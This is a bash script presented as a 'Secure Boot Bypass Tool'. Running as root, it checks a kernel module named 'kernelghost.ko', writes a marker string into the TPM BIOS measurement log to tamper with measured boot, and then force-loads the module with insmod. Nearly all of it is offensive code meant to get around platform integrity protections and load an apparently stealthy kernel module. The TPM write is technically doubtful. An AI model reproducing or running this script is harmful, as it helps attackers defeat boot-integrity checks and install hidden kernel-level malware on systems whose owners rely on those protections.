#!/bin/bash
# Secure Boot Bypass Tool
set -euo pipefail

MODULE_PATH="${1:-./kernelghost.ko}"
DRY_RUN=false
[[ "$#" -gt 1 && "$2" == "--dry-run" ]] && DRY_RUN=true

TPM_MEASURE="/sys/kernel/security/tpm0/binary_bios_measurements"

# Root check
if [[ $EUID -ne 0 ]]; then
	echo "Run as root" >&2
	exit 1
fi

# Dry run mode
if $DRY_RUN; then
	echo "[DRY RUN] Would load $MODULE_PATH with TPM bypass"
	exit 0
fi

# Module checks
if [[ ! -f "$MODULE_PATH" ]]; then
	echo "Module missing" >&2
	exit 1
fi

CURRENT_KERNEL=$(uname -r)
MODULE_KERNEL=$(modinfo "$MODULE_PATH" | awk -F: '/vermagic:/ {print $2}' | xargs)

if [[ "$MODULE_KERNEL" != "$CURRENT_KERNEL"* ]]; then
	echo "Kernel mismatch: Module($MODULE_KERNEL) vs System($CURRENT_KERNEL)" >&2
	exit 1
fi

# TPM manipulation
if [[ ! -f "$TPM_MEASURE" ]]; then
	echo "TPM unavailable" >&2
	exit 1
fi

echo -n "KernelGhost" | tee "$TPM_MEASURE" >/dev/null

# Secure Boot check
if [[ -d /sys/firmware/efi ]] && \
   [[ $(mokutil --sb-state 2>/dev/null) =~ "enabled" ]]; then
	echo "Secure Boot enabled - risk of failure" >&2
fi

# Load module
if ! insmod "$MODULE_PATH"; then
	dmesg | tail -n 20
	echo "Module load failed - check dmesg" >&2
	exit 1
fi

echo "Module loaded successfully"
exit 0